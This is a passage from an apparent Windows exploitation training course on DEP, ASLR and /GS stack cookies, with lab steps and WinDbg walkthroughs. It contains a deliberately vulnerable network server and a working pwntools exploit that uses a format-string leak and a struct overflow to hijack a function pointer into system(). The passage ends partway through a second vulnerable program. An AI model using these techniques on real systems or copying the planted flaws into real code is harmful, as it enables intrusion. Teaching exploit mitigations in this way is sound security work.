Target: IE 6 on Windows XP (no ASLR)
Impact: Targeted attack against Google employees

Exploit Flow (without ASLR):
1. Malicious webpage triggers UAF
2. Heap spray at predictable address (0x0c0c0c0c)
3. Shellcode at known location
4. ROP gadgets at known DLL offsets
5. Code execution achieved

Why ASLR Would Block:
- Heap spray address unpredictable
- DLL gadget addresses unknown
- Attacker needs information leak first
```

**Lesson**: ASLR forces attackers to chain vulnerabilities (info leak + code exec).

#### CVE-2021-40444: MSHTML RCE (Modern Attack - Mitigations Active)

**How Modern Mitigations Affected the Exploit**:

```text
Vulnerability: MSHTML URL protocol handler
Impact: RCE via malicious Office document
Mitigations Present: DEP, ASLR, CFG

Attacker's Challenge:
1. Cannot use simple shellcode (DEP)
2. Cannot hardcode addresses (ASLR)
3. Indirect calls validated (CFG)

Actual Exploit:
1. Used legitimate COM objects for initial execution
2. Launched CAB file to extract payload
3. DLL side-loading to bypass CFG
4. Used existing signed code for malicious actions

Lesson: Mitigations forced complex, multi-stage attack
```

### Practical Exercise

#### Task 1: Test DEP Protection

1. **Create vulnerable program**:

   ```c
   // Save as C:\Windows_Mitigations_Lab\src\dep_vuln.c
   // Simple buffer overflow with shellcode
   #include <stdio.h>
   #include <string.h>

   char shellcode[] = "\xcc\xc3";  // int3; ret

   int main() {
       char buffer[100];
       fgets(buffer, 200, stdin);  // Overflow
       void (*f)() = (void(*)())shellcode;
       f();  // Execute
       return 0;
   }
   ```

2. **Compile without DEP**:

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS- /D_CRT_SECURE_NO_WARNINGS src\dep_vuln.c /Fe:bin\dep_vuln_disabled.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO
   ```

3. **Test - should execute**:

   ```bash
   echo AAAAAAA... | bin\dep_vuln_disabled.exe
   # Works (or int3 breakpoint)
   ```

4. **Recompile with DEP**:

   ```bash
   cl /GS- /D_CRT_SECURE_NO_WARNINGS src\dep_vuln.c /Fe:bin\dep_vuln_enabled.exe /link /NXCOMPAT /DYNAMICBASE:NO
   ```

5. **Test - should crash**:
   ```bash
   echo AAAAAAA... | bin\dep_vuln_enabled.exe
   # Access violation! (DEP blocks shellcode execution)
   ```

#### Task 2: Observe ASLR

1. **Compile check_aslr.c with ASLR**
2. **Run 5 times, note addresses**
3. **Reboot VM**
4. **Run 5 more times**
5. **Observe: addresses changed after reboot**

#### Task 3: Mitigation Detection

1. **Check Windows binaries**:

   ```bash
   dumpbin /headers C:\Windows\System32\notepad.exe | findstr "Dynamic NX"
   ```

2. **Check your compiled programs**
3. **Document which protections are active**

### Key Takeaways

1. **DEP prevents code execution**: Shellcode on stack/heap blocked
2. **ASLR randomizes addresses**: Hardcoded addresses don't work
3. **Both are foundational**: Required for modern exploitation
4. **Detection is straightforward**: Many tools available
5. **Crash Dumps Never Lie**: The Exception Record (`.exr -1`) tells you exactly WHICH mitigation killed the exploit.
6. **Hardware Matters**: The NX bit is a physical capability of the CPU; software just enables it.
7. **Circumvention is possible**: But requires advanced techniques (Week 8)

### Discussion Questions

1. What determines whether ASLR randomizes per-boot vs per-launch? (Hint: ForceRelocateImages, shared mappings)
2. What's the relationship between entropy and ASLR effectiveness?
3. How does DEP affect return-to-libc attacks? (It doesn't directly - why?)
4. Can ASLR and DEP be defeated individually, or must both be bypassed?
5. Why does ASLR require "PIE" (Position Independent Executable) to work fully?
6. If you have a buffer overflow on the stack, but DEP is on, why can't you just jump to your buffer?
7. How does an "Information Leak" defeat ASLR?
8. Why is `0xC0000005` with `Parameter[0]=8` the "smoking gun" for a DEP violation?

## Day 2: Stack Protection Mechanisms

- **Goal**: Understand stack cookies, SEHOP, and other stack-based protections.
- **Activities**:
  - _Reading_:
    - [Stack Cookies in Visual C++](https://learn.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)
    - [SEHOP Overview](https://msrc.microsoft.com/blog/2009/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
  - _Online Resources_:
    - [Defeating Buffer Overflow Protection](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-litchfield.pdf)
    - [SEH overwrite and its exploitability](https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf)
  - _Tool Setup_:
    - Visual Studio with /GS
    - WinDbg for stack inspection
  - _Exercise_:
    - Trigger stack cookie check
    - Test SEH overwrite protection
    - Verify SEHOP prevents exploit

### Stack Cookies (/GS)

**What are Stack Cookies?**:

- Random value placed before return address
- Checked before function returns
- Detects stack buffer overflows
- Terminates process if corrupted

**How They Work**:

```c
// Without /GS
void function(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

// Stack layout:
// [buffer][saved EBP][return address]
// Overflow: overwrites return address directly

// With /GS
void function(char *input) {
    char buffer[64];
    __int64 cookie = __security_cookie;  // Inserted by compiler
    strcpy(buffer, input);
    if (cookie != __security_cookie) {
        __security_check_cookie(cookie);  // Terminates!
    }
}

// Stack layout:
// [buffer][cookie][saved EBP][return address]
// Overflow: must overwrite cookie to reach return address
```

**Cookie Generation**:

```c
// __security_cookie is initialized at process startup
// Based on:
// - Current time (GetSystemTimeAsFileTime)
// - Process ID
// - Thread ID
// - Performance counter
// - Stack address

// Result: 32-bit or 64-bit random value
```

**Cookie Check**:

```asm
; Function prologue (x86)
push ebp
mov ebp, esp
sub esp, 0x44           ; Allocate locals
mov eax, ___security_cookie
xor eax, ebp            ; XOR with frame pointer
mov [ebp-0x04], eax     ; Store on stack

; Function body...

; Function epilogue
mov ecx, [ebp-0x04]     ; Load cookie
xor ecx, ebp            ; XOR with frame pointer
call @__security_check_cookie@4  ; Check
mov esp, ebp
pop ebp
ret
```

**Testing Stack Cookies**:

```c
// src\stack_overflow.c
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];

    printf("[*] Entering vulnerable()\n");
    printf("[*] Buffer at: %p\n", buffer);
    printf("[*] Copying %zu bytes\n", strlen(input));
    fflush(stdout);  // Ensure output before potential crash

    strcpy(buffer, input);

    printf("[*] Copy complete\n");
    printf("[*] Returning from vulnerable()...\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    printf("[+] Program started\n");
    if (argc > 1) {
        vulnerable(argv[1]);
        printf("[+] Returned from vulnerable() successfully!\n");
    }
    printf("[+] Program ending normally\n");
    return 0;
}
```

**Compile Without /GS**:

```bash
# Save the source code to the lab src directory
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\stack_overflow.c /Fe:bin\stack_overflow_no_gs.exe /link /DEBUG /NXCOMPAT:NO /DYNAMICBASE:NO
# Test overflow
python -c "import subprocess; subprocess.run(['bin\\stack_overflow_no_gs.exe', 'A'*500])"
# [*] Copying 500 bytes
# <crash during strcpy - corrupted critical memory>
```

**Compile With /GS**:

```bash
# Compile with all mitigations (Day 1 standard setup)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\stack_overflow.c /Fe:bin\stack_overflow.exe /link /DEBUG /NXCOMPAT /DYNAMICBASE

# Test overflow
python -c "import subprocess; subprocess.run(['bin\\stack_overflow.exe', 'A'*500])"
# [*] Copying 500 bytes
# [*] Copy complete
# [*] Returning from vulnerable()...
# <security cookie check failed - controlled termination>
```

**Viewing in WinDbg**:

```bash
# Launch with overflow argument (use 500 bytes to trigger detection
# cmd: bin\stack_overflow.exe
# arg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
# might need a `g` to start it based on your setup
# Set breakpoint at vulnerable function
bp stack_overflow!vulnerable
# bp stack_overflow_no_gs!vulnerable for the other one
g

# check for __security_check_cookie near ret
uf .
```

#### Deep Dive: WinDbg Stack Cookie Analysis

**Lab: Complete Stack Cookie Investigation**:

```bash
# Step 1: Examine the global security cookie
# Find the security cookie (might need to hit `g` first to initialize)
x stack_overflow!__security_cookie
# Example: 00007ff6`5056b140 stack_overflow!__security_cookie = 0x00004336`aa6df55d

# Step 2: Set breakpoint at function entry and step past prologue
bp stack_overflow!vulnerable
g

# PRO-TIP: By default, 't' steps one SOURCE LINE.
# One 't' will likely execute the entire prologue.
# Look at the disassembly ('u .') to ensure you are still in vulnerable()
# but past the 'mov [rsp+60h], rax' instruction.
t

# If you want to step instruction-by-instruction regardless of source:
# Use 't' after running: l- t
# (l- t disables source mode stepping)

# Step 3: Examine stack frame with cookie
# Ensure you are still in vulnerable()! If you see 'printf', you stepped too far.
r rsp
# Example: rsp=000000b2e68ff8b0
dq rsp+60 L1
# Example: 000000b2`e68ff910  00004384`4ce20ded

# Step 4: Understand the XOR operation
# IMPORTANT: In WinDbg expressions, symbols evaluate to their ADDRESS.
# Use poi() to get the VALUE stored at that address.
? poi(stack_overflow!__security_cookie) ^ rsp
# Example Evaluate expression: 00004384`4ce20ded

# The result of this MUST match the value you saw with 'dq' on the stack.

# Step 5: Watch the epilogue check
# Set a breakpoint near the end of vulnerable()
uf .
# Example: bp stack_overflow!vulnerable+0xaf
g

# Triggering the failure:
# (2924.7d4): Security check failure or stack buffer overrun - code c0000409
# Subcode: 0x2 FAST_FAIL_STACK_COOKIE_CHECK_FAILURE
# stack_overflow!__report_gsfailure+0x5:
# 00007ff6`504d7945 cd29            int     29h
```

**Variable Reordering by /GS**:

The compiler reorders local variables so that "buffers" (arrays) are placed at higher addresses, closer to the security cookie. This prevents an overflow from overwriting other local variables (like function pointers or class objects) before hitting the cookie.

**Source Code**:

```c
// src\var_reorder.c
#include <stdio.h>
#include <string.h>

// Force GS check even for small/unused buffers
#pragma strict_gs_check(on)

void test_reordering() {
    int count = 0x11111111;
    char buffer[16];
    void* ptr = (void*)0x4444444444444444;

    // Use the variables to prevent optimization
    sprintf(buffer, "Value: %d", count);
    printf("[*] Buffer: %s, Ptr: %p\n", buffer, ptr);
}

int main() {
    test_reordering();
    return 0;
}
```

**Viewing Variable Reordering in WinDbg**:

**Compile with /GS and debug info**:

```bash
# Save the test code to C:\Windows_Mitigations_Lab\src\var_reorder.c
cl /GS /Zi src\var_reorder.c /Fe:bin\var_reorder.exe /link /NXCOMPAT /DYNAMICBASE

windbg C:\Windows_Mitigations_Lab\bin\var_reorder.exe
bp var_reorder!test_reordering
g

# View local variable layout
dv /V
# Expected Output:
# @rsp+0x0030    buffer = char [16] "..."
# @rsp+0x0028       ptr = 0x...
# @rsp+0x0020     count = 0x...

# Notice: buffer has the HIGHEST offset (+30) among data variables.

# Or examine disassembly
uf var_reorder!test_reordering

# Proving Protection Layout:
# 1. Cookie is stored at [rsp+40h]
# 2. Buffer starts at  [rsp+30h]
# 3. Buffer ends at    [rsp+30h] + 16 bytes = [rsp+40h] (Exactly hitting the cookie!)

# If the compiler didn't reorder, buffer might be at [rsp+20h].
# An overflow of 16 bytes would overwrite 'count' and 'ptr'
# potentially giving control of execution BEFORE the cookie is even checked.
```

### Stack Cookie Bypass Techniques

Understanding how to bypass stack cookies is essential for both offensive security research
and building more robust defenses. Here we cover the primary bypass techniques.

#### Technique 1: Information Leak (Cookie Disclosure)

On Windows 11 with Intel CET enabled, even if you successfully leak and reconstruct the stack cookie, overwriting the return address will still be caught by the hardware shadow stack.
The shadow stack maintains a separate, protected copy of return addresses that the attacker cannot modify.
This technique demonstrates the **cookie leak and data-only attack** approach:

1. Use a format string bug to leak the XOR'd cookie from the stack
2. Instead of hijacking the return address (blocked by CET), corrupt a **function pointer** or **critical variable** that is used BEFORE the function returns
   This is the modern reality: cookie bypass alone is no longer sufficient for RIP control on CET-enabled systems. Data-only attacks are the way forward.

**Vulnerable Server Code (Windows)**:

```c
// vulnerable_server.c
// Demonstrates: format string leak + data-only attack via function pointer
// The server has TWO bugs:
//   1. Format string in Stage 1 (leak primitive)
//   2. Stack buffer overflow in Stage 2 (write primitive)
//
// KEY INSIGHT: /GS reorders local variables so arrays sit closest to the
// cookie, making it impossible to overflow from a stack array into a separate
// local function pointer. To defeat this, we use a STRUCT: the C standard
// guarantees struct member layout order, and /GS does NOT reorder members
// within a struct. By placing the buffer and handler in the same struct,
// overflowing req.data directly overwrites req.handler.
//
// This also sidesteps CET shadow stacks since no return address is used.

#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 9999
#define DATA_SIZE 128

// Two handler functions - attacker wants to redirect to dangerous_handler
void safe_handler(const char* msg) {
    printf("[SAFE] Echoing: %s\n", msg);
}

void dangerous_handler(const char* msg) {
    printf("[DANGER] Executing: %s\n", msg);
    system(msg);  // RCE if attacker controls msg!
}

typedef void (*handler_t)(const char*);

// /GS does NOT reorder struct members - C standard guarantees layout order.
// Overflowing 'data' (128 bytes) directly overwrites 'handler' at offset 128.
struct request {
    char data[DATA_SIZE];   // offset 0   - overflow source
    handler_t handler;      // offset 128 - overflow target
    int status;             // offset 136
};

void handle_client(SOCKET client_sock) {
    // Stage 1 uses a separate buffer for the format string leak.
    // Stage 2 uses a struct to bypass /GS variable reordering.
    //
    // Why a struct? /GS reorders LOCAL variables so arrays are placed at
    // the highest stack addresses (closest to the cookie). This means a
    // plain "char buffer[128]" local will be ABOVE a "handler_t handler"
    // local - overflow goes UP toward the cookie, AWAY from handler.
    //
    // But /GS cannot reorder struct members (C standard §6.7.2.1 guarantees
    // order). In struct request, 'data' is at offset 0 and 'handler' is at
    // offset 128. Overflow of data[128] goes directly into handler.
    //
    // Stack layout (high to low):
    //   [return address]           <- protected by CET shadow stack
    //   [saved RBP]
    //   [GS cookie (XOR'd)]       <- /GS protection
    //   [leak_buf - 128 bytes]    <- /GS pushes arrays up
    //   [req.status]              <- struct is one unit, below arrays
    //   [req.handler]             <- TARGET at req + 128
    //   [req.data - 128 bytes]    <- overflow source at req + 0
    //   [response - 2048 bytes]   <- format string output
    //   [bytes_recv, etc.]        <- other scalars

    char leak_buf[128];         // Separate buffer for Stage 1 format string
    char response[2048];        // Large enough for format string expansion
    int bytes_recv;
    struct request req;         // Struct layout is NOT reordered by /GS

    req.handler = safe_handler;
    req.status = 0;
    memset(req.data, 0, DATA_SIZE);

    // ---- Stage 1: Format String Leak ----
    // Bug: snprintf(response, ..., leak_buf) uses attacker-controlled format
    // We use snprintf with a safe output size to avoid crashing here.
    // The VULNERABILITY is that the format string itself is attacker-controlled,
    // which leaks stack values via %p specifiers.
    bytes_recv = recv(client_sock, leak_buf, sizeof(leak_buf) - 1, 0);
    if (bytes_recv <= 0) return;
    leak_buf[bytes_recv] = '\0';

    printf("[*] Stage 1: Processing format string (leak)...\n");
    printf("[*] req.data    @ %p\n", req.data);
    printf("[*] req.handler @ %p -> %p\n", &req.handler, (void*)req.handler);
    printf("[*] offsetof(handler) = %zu bytes from req.data\n",
           (char*)&req.handler - req.data);
    fflush(stdout);

    // VULNERABILITY 1: Format string bug - leaks stack values
    // snprintf prevents output buffer overflow, but attacker controls the format
    _snprintf(response, sizeof(response) - 1, leak_buf);
    response[sizeof(response) - 1] = '\0';
    send(client_sock, response, (int)strlen(response), 0);

    // ---- Stage 2: Overflow -> Function Pointer Corruption ----
    // Bug: recv reads up to 1024 bytes into req.data which is only 128 bytes.
    // Bytes 128+ overwrite req.handler (the function pointer).
    printf("[*] Stage 2: Waiting for overflow payload...\n");
    fflush(stdout);
    bytes_recv = recv(client_sock, req.data, 1024, 0);
    if (bytes_recv <= 0) return;

    printf("[*] Received %d bytes (buffer is %d)\n", bytes_recv, DATA_SIZE);
    printf("[*] req.handler now points to: %p\n", (void*)req.handler);
    fflush(stdout);

    // The handler is called BEFORE function return (before cookie check!)
    // If overflow corrupted it, this calls the attacker's target.
    printf("[*] Calling handler...\n");
    fflush(stdout);
    req.handler(req.data);  // <-- Data-only attack: struct member, not return addr
    // CET doesn't protect this because it's an indirect CALL, not a RET.
    // (CFG would catch this - but we compiled without /guard:cf for this demo)

    printf("[*] Handler returned, function epilogue next...\n");
    fflush(stdout);
    // Cookie check happens HERE at function return.
    // If we overflowed past the cookie, process dies NOW - but handler already ran!
}

int main() {
    WSADATA wsa;
    SOCKET server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);

    WSAStartup(MAKEWORD(2, 2), &wsa);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, 5);

    printf("Server listening on port %d...\n", PORT);
    printf("safe_handler      @ %p\n", safe_handler);
    printf("dangerous_handler @ %p\n", dangerous_handler);
    fflush(stdout);

    while (1) {
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        printf("\nClient connected!\n");
        fflush(stdout);
        handle_client(client_sock);
        closesocket(client_sock);
        printf("[*] Connection closed (server stays alive for next client)\n");
        fflush(stdout);
    }

    closesocket(server_sock);
    WSACleanup();
    return 0;
}
```

**Compile**:

```bash
# Save source to C:\Windows_Mitigations_Lab\src\vulnerable_server.c
cd C:\Windows_Mitigations_Lab

# Compile WITH /GS but WITHOUT CFG (to isolate cookie bypass)
# /guard:cf is intentionally omitted - CFG would block the indirect call
# /DYNAMICBASE:NO /FIXED makes addresses predictable for learning
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\vulnerable_server.c ^
   /Fe:bin\vuln_server.exe /link ws2_32.lib /DEBUG ^
   /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Also compile a CFG-protected version to show defense:
cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_server.c ^
   /Fe:bin\vuln_server_cfg.exe /link ws2_32.lib /DEBUG ^
   /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf

# Verify mitigations:
dumpbin /headers bin\vuln_server.exe | findstr "NX Guard"
# Expected: NX compatible  (no Guard CF)
dumpbin /headers bin\vuln_server_cfg.exe | findstr "NX Guard"
# Expected: NX compatible + Control Flow Guard
```

**Pwntools Exploit - Cookie Leak + Data-Only Attack**:

```python
#!/usr/bin/env python3
"""
exploits/sc_1.py
Stack Cookie Bypass via Format String Leak + Function Pointer Overwrite

This exploit demonstrates a DATA-ONLY attack that works even on Windows 11
with CET (shadow stacks) enabled, because it never hijacks a return address.

Attack flow:
  Stage 1: Format string leak to dump stack values (find layout info)
  Stage 2: Overflow struct buffer to overwrite adjacent function pointer
           The handler is called BEFORE the function epilogue cookie check.

Why this works despite /GS:
  /GS reorders LOCAL variables so arrays are near the cookie. But it does NOT
  reorder STRUCT MEMBERS (C standard guarantees layout). Our struct places
  data[128] at offset 0 and handler at offset 128. Overflow of data directly
  overwrites handler regardless of /GS reordering of the struct as a whole.

What this bypasses:
  - /GS stack cookies (handler called before cookie check at function return)
  - /GS variable reordering (struct members maintain declared order)
  - CET shadow stacks (no return address corruption - indirect CALL, not RET)
  - DEP (no shellcode, reuses existing code)

What would block this:
  - CFG (/guard:cf) - validates indirect call targets against bitmap

Usage:
  1. Start server:  bin\\vuln_server.exe
  2. Run exploit:   python exploits\\sc_1.py
  3. With offsets:   python exploits\\sc_1.py --exploit
"""

from pwn import *
import time
import sys
import re

# Configuration
HOST = "127.0.0.1"
PORT = 9999

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def leak_stack_values(r):
    """
    Stage 1: Use format string bug to leak stack values.

    On Windows x64, MSVCRT %p prints bare hex WITHOUT '0x' prefix:
      e.g., "000000000014FA48" not "0x000000000014FA48"
    This is different from glibc which prints "0x14fa48".

    We dump values to find:
      - The handler function pointer (points to safe_handler)
      - Stack/code pointers for orientation
      - Cookie candidates for analysis
    """
    log.info("Stage 1: Leaking stack values via format string")

    # Use fewer specifiers to keep output within bounds.
    # Each %p on MSVCRT outputs 16 hex chars. With '.' separator:
    # 20 * (16 + 1) = 340 bytes — safely within response[2048].
    payload = b"%p." * 20
    r.send(payload)

    time.sleep(1.0)

    try:
        response = r.recv(8192, timeout=5)
    except EOFError:
        log.error("Connection closed before receiving leak response")
        log.error("The server may have crashed during sprintf.")
        log.error("Check server console for error messages.")
        return None

    if not response:
        log.error("Empty response - server may have crashed")
        return None

    log.info(f"Received {len(response)} bytes")
    log.info(f"Raw: {response[:200]}")

    # Parse leaked values - handle BOTH MSVCRT and glibc %p formats:
    #   MSVCRT:  "000000000014FA48" (bare 16-char hex, uppercase)
    #   glibc:   "0x14fa48"         (0x prefix, lowercase)
    #   Either:  "(nil)" or "00000000"  (null)
    leaks = []
    for part in response.split(b'.'):
        part = part.strip()
        if not part:
            continue
        try:
            decoded = part.decode('ascii', errors='ignore').strip()
            if not decoded:
                continue

            if decoded.lower() == '(nil)':
                leaks.append(0)
            elif decoded.startswith('0x') or decoded.startswith('0X'):
                # glibc-style: "0x7fff12345678"
                leaks.append(int(decoded, 16))
            elif re.match(r'^[0-9A-Fa-f]+$', decoded) and len(decoded) >= 8:
                # MSVCRT-style: "000000000014FA48" (bare hex, 8-16 chars)
                leaks.append(int(decoded, 16))
            else:
                continue
        except (ValueError, TypeError):
            continue

    if not leaks:
        log.error("No values parsed from format string output!")
        log.error("Raw response was: %s", response)
        return None

    # Display all leaked values with analysis
    log.info(f"Parsed {len(leaks)} values:")
    print(f"\n{'Idx':>4} {'Value':>20} {'Analysis'}")
    print("-" * 65)

    for i, val in enumerate(leaks):
        analysis = ""
        if val == 0:
            analysis = "NULL"
        elif val < 0x10000:
            analysis = "small value / size / flags"
        elif 0x0000000140000000 <= val <= 0x000000014FFFFFFF:
            analysis = "<-- EXE code pointer (check if safe/dangerous_handler)"
        elif 0x00007FF000000000 <= val <= 0x00007FFFFFFFFFFF:
            analysis = "DLL code pointer (ntdll/kernel32/etc)"
        elif 0x0000000000010000 <= val <= 0x00000000FFFFFFFF:
            analysis = "stack/low pointer"
        elif val > 0x100000000:
            # High entropy, not obviously a pointer - could be cookie
            analysis = "** COOKIE CANDIDATE ** (high entropy)"
        print(f"[{i:3d}] 0x{val:016X}  {analysis}")

    print()
    return leaks


def exploit():
    """
    Discovery phase:
    1. Leak stack values to understand layout
    2. Send cyclic pattern to find offset to handler
    """
    log.info(f"Target: {HOST}:{PORT}")
    log.info("")
    log.info("DISCOVERY PHASE")
    log.info("===============")
    log.info("Step 1: Leak stack values via format string")
    log.info("Step 2: Send cyclic pattern to find handler offset")
    log.info("")

    # ---- Stage 1: Leak ----
    r = remote(HOST, PORT)
    leaks = leak_stack_values(r)
    if not leaks:
        r.close()
        return

    # ---- Stage 2: Cyclic pattern to find handler offset ----
    # struct request { char data[128]; handler_t handler; int status; };
    # In theory, handler is at data+128. But let's verify empirically
    # in case of padding or compiler alignment.
    log.info("Stage 2: Sending cyclic pattern to find handler offset")
    log.info("Watch the server console for: 'req.handler now points to: XXXXXXXX'")
    log.info("Then use cyclic_find() with that value to get the exact offset.")

    pattern = cyclic(512)
    time.sleep(0.5)
    r.send(pattern)

    time.sleep(1)
    r.close()

    log.info("")
    log.info("=" * 60)
    log.info("NEXT STEPS:")
    log.info("=" * 60)
    log.info("1. Read the server output for dangerous_handler address")
    log.info("   e.g.: dangerous_handler @ 00000001400043BD")
    log.info("")
    log.info("2. Read the corrupted handler value from server output")
    log.info("   e.g.: req.handler now points to: 6261617462616173")
    log.info("")
    log.info("3. Find offset:")
    log.info("   python -c \"from pwn import *; print(cyclic_find(0x<value>))\"")
    log.info("   (expected: 128 for struct request with data[128])")
    log.info("")
    log.info("4. Update HANDLER_OFFSET and DANGEROUS_HANDLER in this script")
    log.info("5. Run: python exploits\\sc_1.py --exploit")
    log.info("=" * 60)


def exploit_with_known_offset():
    """
    Exploitation phase (after discovery).
    Uses known offset and address to overwrite the handler.

    The struct layout guarantees:
      req.data    @ offset 0    (128 bytes)
      req.handler @ offset 128  (8 bytes on x64)
      req.status  @ offset 136  (4 bytes)

    So HANDLER_OFFSET should be 128 (= sizeof(data)).
    """
    # ===== UPDATE THESE VALUES FOR YOUR BUILD =====
    HANDLER_OFFSET = 128                  # offsetof(struct request, handler)
    DANGEROUS_HANDLER = 0x1400043BD       # from server output / dumpbin
    # ================================================

    log.info(f"Exploiting: offset={HANDLER_OFFSET}, target=0x{DANGEROUS_HANDLER:X}")

    r = remote(HOST, PORT)

    # Stage 1: Send benign string (we don't need the leak for exploitation)
    r.send(b"hello_from_exploit")
    time.sleep(0.5)
    try:
        r.recv(4096, timeout=3)  # Consume the leak response
    except EOFError:
        pass

    # Stage 2: Targeted overflow
    # req.data[0..] is passed as argument to req.handler(req.data).
    # If handler = dangerous_handler, it calls system(req.data).
    # So put the command string at the START of data, pad to offset, then address.
    #
    # NOTE: system() stops at null byte, so we null-terminate the command
    # and use 'A' padding after. The padding bytes are safely ignored by system().

    command = b"calc.exe\x00"                           # 9 bytes (with null)
    padding = b"B" * (HANDLER_OFFSET - len(command))    # pad to offset 128
    handler_addr = p64(DANGEROUS_HANDLER)               # 8 bytes, little-endian

    payload = command + padding + handler_addr

    log.info(f"Payload layout ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]   command: {command}")
    log.info(f"  [{len(command)}..{HANDLER_OFFSET-1}] padding: {len(padding)} bytes")
    log.info(f"  [{HANDLER_OFFSET}..{HANDLER_OFFSET+7}] handler: 0x{DANGEROUS_HANDLER:X}")

    time.sleep(0.5)
    r.send(payload)

    time.sleep(2)
    r.close()

    log.success("Exploit sent!")
    log.success("Check the server console for:")
    log.success("  [DANGER] Executing: calc.exe")
    log.success("  (calc.exe should open!)")
    log.info("")
    log.info("The server process will then crash with 0xC0000409 (/GS cookie)")
    log.info("because the overflow ALSO corrupted the cookie. But the handler")
    log.info("already executed — the damage is done BEFORE /GS checks!")
    log.info("")
    log.info("To test CFG: run against vuln_server_cfg.exe instead.")
    log.info("NOTE: CFG is coarse-grained — dangerous_handler IS a valid function")
    log.info("entry, so CFG will ALLOW this redirect. CFG only blocks calls to")
    log.info("mid-function addresses, shellcode, or ROP gadgets.")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit_with_known_offset()
    else:
        exploit()
```

**Running the Exploit**:

```bash
# Terminal 1: Start the server
cd C:\Windows_Mitigations_Lab
.\bin\vuln_server.exe
# Output:
#   Server listening on port 9999...
#   safe_handler      @ 0000000140001F8C
#   dangerous_handler @ 00000001400043BD

# Terminal 2: Discovery phase
python exploits\sc_1.py
# This leaks stack values and sends a cyclic pattern.
# Check server output for:
#   req.handler now points to: 6261616962616168
# Then find offset:
#   python -c "from pwn import *; print(cyclic_find(0x6261616962616168))"
#   -> 128  (confirms handler is at data + 128, as expected from struct layout)

# Terminal 2: Update DANGEROUS_HANDLER in script with server's address, then:
python exploits\sc_1.py --exploit
# Server should print: [DANGER] Executing: calc.exe
# calc.exe opens, then server crashes (cookie check)
```

#### Technique 2: Partial Overwrite (LSB Overwrite)

Corrupt only the low byte(s) of a function pointer within a struct, redirecting execution
to a nearby function without needing a full 8-byte address write. This works because
functions in the same binary share upper address bytes when ASLR is off (`/FIXED`).

> [!NOTE]
> **Why partial overwrite?** In some scenarios, you can only corrupt a limited number of
> bytes past the buffer boundary (e.g., off-by-one, or the overflow is length-limited).
> If the target function pointer shares its upper bytes with the desired target (common
> in the same module without ASLR), overwriting just 1-2 bytes is enough.
>
> **CET compatibility**: Like Technique 1, this targets a struct member function pointer
> (indirect CALL), not the return address. CET shadow stacks don't block it.

**Vulnerable Code**:

```c
// partial_overwrite.c
// Demonstrates: off-by-N overflow within a struct that partially corrupts
// a function pointer, redirecting to a different function in the same module.
//
// Key insight: Without ASLR (/FIXED), all functions in the EXE share the
// same upper bytes (e.g., 0x00000001400XXXXX). Only the lower bytes differ.
// An overflow that corrupts just the low 1-2 bytes of a function pointer
// can redirect to any function within a 256-byte (1 byte) or 64KB (2 byte) range.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*action_t)(const char*);

void log_message(const char* msg) {
    printf("[LOG] %s\n", msg);
}

void exec_command(const char* msg) {
    printf("[EXEC] Running: %s\n", msg);
    system(msg);  // RCE!
}

// Struct layout is guaranteed by C standard - /GS cannot reorder members
struct packet {
    char name[32];      // offset 0   - small buffer
    action_t action;    // offset 32  - function pointer (our target)
    int priority;       // offset 40
};

void process_packet(struct packet *pkt) {
    printf("[*] Processing packet: name='%s'\n", pkt->name);
    printf("[*] Action ptr: %p\n", (void*)pkt->action);
    fflush(stdout);

    // Call the action handler - this is an indirect CALL (CET doesn't block)
    pkt->action(pkt->name);
}

int main() {
    struct packet pkt;
    pkt.action = log_message;
    pkt.priority = 0;

    printf("log_message  @ %p\n", (void*)log_message);
    printf("exec_command @ %p\n", (void*)exec_command);
    printf("Offset between: %lld bytes\n",
           (long long)((char*)exec_command - (char*)log_message));
    fflush(stdout);

    printf("\nEnter packet name (max 32 chars): ");
    fflush(stdout);

